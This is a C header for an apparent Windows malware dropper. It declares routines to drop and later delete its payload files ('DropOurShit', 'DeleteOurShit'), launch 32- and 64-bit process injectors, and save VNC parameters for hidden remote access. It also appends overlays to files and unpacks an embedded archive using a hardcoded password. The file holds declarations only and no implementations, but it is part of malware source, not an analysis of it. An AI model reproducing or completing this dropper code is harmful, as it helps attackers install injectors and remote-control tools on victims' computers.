#ifndef DROPPER_H_INCLUDED
#define DROPPER_H_INCLUDED

extern char szSelfNameA[MAX_PATH];
extern TCHAR szSelfName[MAX_PATH];

void DropOurShit();
void ReadConfig();

extern char szInj32Exe[],
            szInj64Exe[],
            szProfilePathA[MAX_PATH];

void AppendOverlayA(char *lpstrFile);
void AppendOverlayW(WCHAR *lpstrFile);

#ifdef _UNICODE
#define AppendOverlay AppendOverlayW
#else
#define AppendOverlay AppendOverlayA
#endif

typedef BOOL WINAPI _IsWow64Process(HANDLE,bool *);
extern _IsWow64Process *fnIsWow64Process;
bool ExtractOneFile(char *lpFile,char *lpPath);

void VNC_SaveParams();
void DeleteOurShit();

extern bool bIsWow64,bNtfs;

#define KB 1024
#define MB KB*1024

#define inj32 "inj_x86.exe"
#define inj64 "inj_x64.exe"

bool CreateDirectoryTree(LPWSTR path);
LPWSTR AnsiToUnicodeEx(LPSTR source,int size);


#define ARCH_PASSWORD "password"
#define OpenArch() OpenArchive((TCHAR*)lpDrop,ARCH_PASSWORD,sizeof(ARCH_PASSWORD)-1,true,dwDropSize)

#endif // DROPPER_H_INCLUDED
